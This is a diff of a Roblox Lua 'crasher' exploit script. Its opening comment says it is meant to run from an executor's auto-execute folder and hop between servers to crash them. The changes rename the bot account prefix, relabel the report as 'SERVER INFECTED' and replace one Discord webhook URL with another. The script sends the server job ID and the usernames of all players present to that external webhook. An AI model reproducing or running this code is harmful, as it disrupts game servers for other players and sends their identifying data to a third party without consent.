@@ -1,7 +1,7 @@
 -- place script in auto execute folder it server hop for more chance of crashing the server (rebooting it)
 -- CRASHER V2
 warn("water_hax")
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("SERVER REBOOTING FOR UPDATE WARNING JOIN cBKaHEGptc - TEAM HAXA")
+-- game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("SERVER REBOOTING FOR UPDATE WARNING JOIN cBKaHEGptc - TEAM HAXA")
 task.wait()
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local TeleportService = game:GetService("TeleportService")
@@ -10,7 +10,7 @@ local JobId = game.JobId
 local PlaceId = game.PlaceId
 local Players = game:GetService("Players")
 local lp = game.Players.LocalPlayer
-local Def = "leBotDeRoblox_"
+local Def = "LeFrancaisScripter_"
 local max
 local min
 if lp.Name == tostring(Def.."1") then
@@ -62,13 +62,13 @@ for i = 1, 5 do
             table.insert(players, player.Name)
         end
     
-        local content = "🚨 SERVER CRASHED 🚨\n"
+        local content = "🚨 SERVER INFECTED 🚨\n"
         content = content .. "🆔 Job ID: `" .. game.JobId .. "`\n"
         content = content .. "👥 Players Counts: `" .. tostring(#game.Players:GetPlayers()) .. "`\n"
         content = content .. "👥 Players: `" .. table.concat(players, ", ") .. "`"
     
         http.request({
-            Url = "https://discord.com/api/webhooks/1368622410416263260/Q3d_YET9sxYsnoYvmvnOGtZRR6F8QwrPYeBo-M41UO_qJpteYspR4detWaCy-z-M8zyf",
+            Url = "https://discord.com/api/webhooks/1539253154519056496/1cKfkl5oDiqIeue7J5waVY20z6MpvVjle3d0QiaJbS-7YivEzNUN9sKqYEahbVi5nUwd",
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
